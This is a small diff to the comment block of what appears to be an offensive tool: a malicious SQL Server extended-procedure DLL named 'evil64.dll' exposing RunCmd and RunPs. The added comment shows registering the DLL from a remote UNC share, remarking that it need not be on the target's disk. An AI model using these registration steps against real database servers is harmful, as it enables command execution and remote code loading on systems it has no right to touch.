@@ -11,6 +11,7 @@
 // sp_addextendedproc 'RunCmd', 'c:\Temp\evil64.dll';
 // sp_addextendedproc 'RunPs', 'c:\Temp\evil32.dll';
 // sp_addextendedproc 'RunPs', 'c:\Temp\evil64.dll';
+// sp_addextendedproc 'RunPs', '\\server\share\evil64.dll';  :) - DLL doesn't need to be hosted on target system's disk 
 // RunCmd
 // RunPs
 // removal
